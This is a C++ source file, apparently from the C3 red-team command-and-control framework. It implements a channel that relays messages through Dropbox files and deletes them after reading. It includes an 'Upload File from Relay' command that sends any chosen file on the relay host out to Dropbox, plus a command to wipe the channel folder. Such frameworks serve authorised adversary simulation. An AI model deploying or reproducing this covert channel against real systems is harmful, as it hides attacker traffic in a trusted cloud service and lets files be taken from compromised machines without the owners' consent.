#include "Stdafx.h"
#include "Dropbox.h"
#include "Common/FSecure/Crypto/Base64.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Dropbox::Dropbox(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [DropboxToken, channelName] = arguments.Read<std::string, std::string>();
	m_dropboxObj = FSecure::Dropbox{ DropboxToken, channelName };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Dropbox::OnSendToChannel(ByteView data)
{

	// There is a cap on uploads of files >150mb at which point different APIs are required.
       data = data.SubString(0, 150 * 1024 * 1024);
	m_dropboxObj.WriteMessageToFile(m_outboundDirectionName, data);
	return data.size();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Dropbox::OnReceiveFromChannel()
{
	// Fetch inbound messages as a map of ids and epoch timestamps
	std::map<std::string, std::string> messages = m_dropboxObj.GetMessagesByDirection(m_inboundDirectionName);
	std::vector<std::string> repliesTs;

	// We can't fetch directly with a generated timestamp value, so we're pulling these out 
	// to iterate over and using that as a key to fetch the file by id.
	for (std::map<std::string, std::string>::iterator it = messages.begin(); it != messages.end(); ++it) {
		repliesTs.push_back(it->first);
	}

	std::vector<ByteVector> ret;

	//Read the files in order and delete when data is retrieved.
	for (std::vector<std::string>::iterator ts = repliesTs.begin(); ts != repliesTs.end(); ++ts)
	{
		std::string messagePath = messages[*ts];
		auto fileContent = m_dropboxObj.ReadFile(messagePath);

		m_dropboxObj.DeleteFile(messagePath);
		ret.emplace_back(std::move(fileContent));
	}
	return ret;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Dropbox::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		UploadFile(command);
		return {};
	case 1:
		DeleteAllFiles();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

void FSecure::C3::Interfaces::Channels::Dropbox::UploadFile(ByteView args)
{
	m_dropboxObj.UploadFile(args.Read<std::string>());
}


void FSecure::C3::Interfaces::Channels::Dropbox::DeleteAllFiles()
{
	m_dropboxObj.DeleteAllFiles();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Dropbox::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Dropbox token",
				"min": 1,
				"description": "This token is what channel needs to interact with Dropbox's API"
			},
			{
				"type": "string",
				"name": "Folder name",
				"min": 4,
				"randomize": true,
				"description": "Folder to create for channel"
			}
		]
	},
	"commands": 
	[
		{
			"name": "Upload File from Relay",
			"id": 0,
			"description": "Upload file from host running Relay directly to Dropbox (150mb max.)",
			"arguments": 
			[
				{
                    "type" : "string",
					"name": "Remote Filepath",
					"description" : "Path to upload."
				}
			]
		},
		{
			"name": "Remove All Files",
			"id": 1,
			"description": "Delete channel folder and all files within it.",
			"arguments": []
		}
	]
}
)_";
}
